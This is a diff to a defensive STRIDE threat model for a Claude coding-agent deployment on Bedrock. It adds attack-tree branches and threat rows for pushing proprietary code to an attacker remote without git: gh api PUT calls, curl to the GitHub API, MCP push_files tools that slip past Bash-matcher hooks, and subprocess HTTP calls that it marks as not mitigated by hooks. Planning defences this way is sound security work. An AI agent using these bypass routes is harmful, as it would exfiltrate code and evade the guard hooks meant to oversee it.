@@ -64,6 +64,8 @@ Structured threat analysis using Microsoft's STRIDE framework, mapped to control
 | Secrets in prompts sent to Bedrock | API logs, model context | User pastes credentials | pii-guard.sh (UserPromptSubmit) blocks 15 pattern types |
 | Secrets in tool inputs (file content) | Bedrock API | Claude reads .env then shows in tool input | pii-guard.sh (PreToolUse) blocks |
 | Source code pushed to attacker remote | Code repos | git remote add evil + push | git-guard.sh allowlist |
+| Source code pushed without invoking `git` | Code repos | `gh api -X PUT …/contents/…`, `curl` to api.github.com, `gh repo create` as an exfil target | gh-guard.sh (endpoint + verb policy on the gh CLI and raw REST paths) |
+| Source code pushed by an MCP server | Code repos | `mcp__*__push_files` / `create_or_update_file` / `create_repository` — no `command` field, so no Bash-matcher hook fires | mcp-repo-guard.sh on a `mcp__.*` matcher; pii-guard.sh scans MCP `tool_input` content |
 | Credentials read from disk | .aws/, .ssh/, .env | Read tool exfil | Read deny rules + sandbox.denyRead |
 | Model output contains training-data PII | API response | Anthropic data leakage | Bedrock Guardrails server-side filter |
 | Audit log contains sensitive content | Stored logs | Logs accessible to wrong user | Log directory 0750 root:siem-readers; encrypted at rest |
@@ -113,8 +115,21 @@ GOAL: Push proprietary code to attacker.com
 │   │   └── BLOCKED by Bash(wget:*) ✓
 │   └── 2c. nc (netcat)
 │       └── BLOCKED by Bash(Start-Process *) on Win; sandbox.network on Linux ✓
-└── 3. Trick Claude to write code to /tmp/exfil and let user transfer manually
-    └── PARTIAL: hook can't stop legitimate file writes, but sandbox.allowWrite=cwd helps
+├── 3. Reach the same remote without running git
+│   ├── 3a. gh api -X PUT repos/o/r/contents/... (no branch ⇒ default branch)
+│   │   └── BLOCKED by gh-guard.sh (contents policy) ✓
+│   ├── 3b. gh repo create exfil && gh api -X PUT .../contents/...
+│   │   └── BLOCKED by gh-guard.sh (repo lifecycle) ✓
+│   ├── 3c. curl -X PUT https://api.github.com/repos/.../contents/...
+│   │   └── BLOCKED by gh-guard.sh (same endpoint policy, HTTP client path) ✓
+│   └── 3d. mcp__<server>__push_files / create_repository
+│       └── BLOCKED by mcp-repo-guard.sh (mcp__.* matcher) ✓
+├── 4. Trick Claude to write code to /tmp/exfil and let user transfer manually
+│   └── PARTIAL: hook can't stop legitimate file writes, but sandbox.allowWrite=cwd helps
+└── 5. Write from a subprocess no hook inspects (python requests, compiled binary)
+    └── NOT MITIGATED by hooks: PreToolUse sees the interpreter invocation, not the
+        HTTP call inside it. Compensate with egress control (VPC endpoint +
+        sandbox.network.allowedDomains) and short-lived, least-privilege tokens.
 ```
 
 ### "Bypass all controls"
